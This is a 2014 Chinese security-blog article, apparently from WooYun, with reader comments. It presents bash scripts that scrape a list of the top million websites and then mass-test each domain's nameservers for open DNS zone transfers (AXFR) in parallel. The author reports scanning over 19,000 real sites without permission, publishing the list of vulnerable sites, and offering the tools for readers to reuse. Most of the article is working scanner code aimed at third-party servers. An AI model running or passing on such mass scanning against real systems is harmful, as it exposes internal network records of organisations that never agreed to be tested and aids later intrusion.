@@ -1,0 +1,86 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">批量网站DNS区域传送漏洞检测——bash shell实现</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">燕云</a> <span class="bull">·</span> <time title="2014/05/21 12:18" ui-time="" datetime="2014/05/21 12:18" class="published ng-binding ng-isolate-scope">2014/05/21 12:18</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>下面图中的eecs.cc为笔者自建的一台具有私有根的DNS服务器，且对外开放了区域传送权限，故有结果：cc区域传送成功。该图只是一个实验验证，下面文章正式开始！</p><p><img alt="2014051922562284748.png" img-src="06bbd03b6751bdf298c9331449a38fbbd4b62774.jpg"></p><h2>0x01 寻找域名</h2><hr><p>从互联网上寻找全球Top1000Web站点列表。</p><p>搜寻，发现 <a href="http://www.domainvader.com/website/top-sites.php">http://www.domainvader.com/website/top-sites.php</a> 站点有需要的信息。</p><p>处理过程如下：</p><pre><code>·此处共计1000个统计页面，每个页面有1000个站点信息，故依次抓取这1000个html文档； 
+·使用grep结合正则表达式从这1000个文档之中过滤出我们需要的域名，共计1000000个。 
+</code></pre><p>代码如下：</p><p>其中，grab.sh的参数threads意思为并发GET进程数，视双方通讯链路状态而定，默认为1，如果链路很好，可适当提高，但不宜过高，以防GET请求超时。</p><p>grab.sh：</p><pre><code>#!bash
+#!/bin/bash
+declare x
+declare threads=1
+# process concurrency
+declare mod
+
+for x in `seq 1 1000`
+do
+  echo "http://www.domainvader.com/website/top-${x}000-sites.php"
+  time GET "http://www.domainvader.com/website/top-${x}000-sites.php" &gt; $x.html &amp;
+  mod=$(( x%threads ))
+  if [ "$mod" -eq "0" ]
+  then
+    wait
+  fi
+done
+</code></pre><p>translate.sh：</p><pre><code>#!bash
+#!/bin/bash
+
+declare x
+declare l
+
+if [ -r "top100_0000sites.txt" ]
+then
+  rm -f top100_0000sites.txt
+fi
+
+touch top100_0000sites.txt
+
+for x in `seq 1 1000`
+do
+  echo "analyzing ${x}.html..."
+# check if readable
+  if ! [ -r "${x}.html" ]
+  then
+    echo "file ${x}.html doesn't exist or aren't readable :("
+    echo "file top100_0000sites.txt collect total `cat top100_0000sites.txt | wc -l` websites"
+    exit 1
+  fi
+  l=`grep -Eo --color 'target="_blank"&gt;(http://([A-Za-z0-9_-]+)(\.([A-Za-z0-9_-])+)+)' ${x}.html | wc -l` 
+# check content if been entirely grabbed
+  if [ "$l" -ne "1000" ]
+  then
+    echo "file ${x}.html's content is not entire :( please check"
+    echo "file top100_0000sites.txt collect total `cat top100_0000sites.txt | wc -l` websites"
+    exit 1
+  fi
+  grep -Eo --color 'target="_blank"&gt;(http://([A-Za-z0-9_-]+)(\.([A-Za-z0-9_-])+)+)' ${x}.html | grep -Eo --color '(([A-Za-z0-9_-]+)(\.([A-Za-z0-9_-])+)+)$' &gt;&gt; top100_0000sites.txt
+done
+  echo "done :)"
+  echo "file top100_0000sites.txt collect total `cat top100_0000sites.txt | wc -l` websites" 
+</code></pre><p>最终效果图：</p><p><img alt="2014051923095424447.png" img-src="647f6376e3cd3a4e2d7d6c3fb07e1e33f7d46cc6.jpg"></p><h2>0x02 DNS区域传送权限自动检测</h2><hr><p>有如下命题：</p><pre><code>#!bash
+</code></pre><p>if dig @${ns} ${d} axfr | grep -E --color 'IN[[:space:]]+A|IN[[:space:]]+NS' &amp;>/dev/null</p><p>then</p><p>echo "nice! a hole"</p><p>fi</p><p>上述命题是整个检测程序的核心所在，这个命题是成立的。</p><p>dns&#95;transfer&#95;check.sh 代码如下：</p><p>其中，threads为并发数，默认设置为40，由于一个域名很可能对应多个ns，观察得到实际并发数大概为threads*3 ，domainFileList为参与检测的域名列表文件，可自定义之。</p><pre><code>#!bash
+#!/bin/bash
+
+declare d
+declare s=0
+declare ns_str
+declare ns
+declare mod
+declare threads=40
+# process concurrency
+declare domainFileList="top100_0000sites.txt"
+
+for d in `cat $domainFileList`
+do
+  s=$(( s+1  ))
+  echo "${s} : ${d}"
+  ns_str=`dig -t ns ${d} | grep -E --color 'IN.*NS.*[[:space:]]([A-Za-z0-9_-]+)(\.([A-Za-z0-9_-])+)+\.' | awk  '{print $5}' | grep -Eo --color '([A-Za-z0-9_-]+)(\.([A-Za-z0-9_-])+)+'`
+  for ns in $ns_str
+  do
+    echo $ns
+    if dig @${ns} ${d} axfr | grep -E --color 'IN[[:space:]]+A|IN[[:space:]]+NS' &amp;&gt;/dev/null ; then echo "nice! transfer done! :) rank: $s  domain: $d  ns: $ns  ----&gt;" ; fi &amp; 
+  done
+  mod=$(( s%threads ))
+  if [ "$mod" -eq 0 ] 
+  then
+    wait
+  fi
+done
+</code></pre><p>程序结束。</p><pre><code>#!bash
+# nohup bash dns_transfer_check.sh &amp;&gt;log &amp;
+</code></pre><p>运行一夜之后，扫描到了前19212个站点，然后使用grep、awk、sed等工具处理之，得到满意结果。</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-061403">WooYun: 全球Top1000Websites中存在DNS区域传送漏洞的网站列表</a></p><p><a href="http://static.wooyun.org/20141017/2014101714082995862.zip">dns&#95;domain&#95;check.zip</a></p><p>这是所有资料的链接。重点是dns&#95;transfer&#95;check.sh与域名列表，读者可按照自己的需要自定义参数使用。</p><p>除了world&#95;top1000000，还包含了china&#95;top500与china&#95;top1344&#95;entertainment站点列表 :)</p><p>希望这篇文章能帮助大家！</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">池寒</span> <span class="reply-time">2016-05-21 18:22:42</span></div><p></p><p>感觉得去了解下bash了，看不懂</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">池寒</span> <span class="reply-time">2016-05-21 18:21:32</span></div><p></p><p>@燕云请问这个怎么用</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">F4K3R</span> <span class="reply-time">2014-05-25 02:25:22</span></div><p></p><p>思路赞一个！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">bitcoin</span> <span class="reply-time">2014-05-21 22:09:26</span></div><p></p><p>牛啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xxx</span> <span class="reply-time">2014-05-21 20:43:05</span></div><p></p><p>linux 平台被你们玩精了!</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">动后河</span> <span class="reply-time">2014-05-21 19:52:46</span></div><p></p><p>自愧不如，<br>sh脚本压根看都看不懂</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Bloodwolf</span> <span class="reply-time">2014-05-21 16:44:14</span></div><p></p><p>弄点新鲜的玩意儿呗！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-05-21 16:11:30</span></div><p></p><p>这个是我一直想测试又没有做的，这个字典应该有意思</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">1ee</span> <span class="reply-time">2014-05-21 16:00:39</span></div><p></p><p>学习了!</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xiaoL</span> <span class="reply-time">2014-05-21 15:39:10</span></div><p></p><p>原来bash玩得好这么高端啊- -<br>一直想写就是感觉不好实现<br>学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">燕云</span> <span class="reply-time">2014-05-21 14:35:23</span></div><p></p><p>过奖了 :)</p><p>另外，文章开篇的服务器上有个比较好玩的东西，自己看看，绝对有趣！这个页面捕获了所有尝试 ssh 22 登陆的用户动作。。。<br>http://eecs.cc:8080/secure</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2014-05-21 14:30:07</span></div><p></p><p>这兄弟bash玩儿的很好啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">燕云</span> <span class="reply-time">2014-05-21 13:55:56</span></div><p></p><p>哈哈！<br>dns_transfer_check.sh 里面还有很多需要优化的地方，比如:<br>1.目前的策略是一下子把整个文件读到内存，但是如果列表文件很大，程序开始时很可能会卡顿，而且内存消耗也会很大<br>2.另外，里面的正则模式写的奇丑。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-05-21 12:49:57</span></div><p></p><p>我一直想要哇</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-05-21 12:37:31</span></div><p></p><p>这兄弟bash玩儿的很好啊</p><p></p></div></div></div></div></div></main>
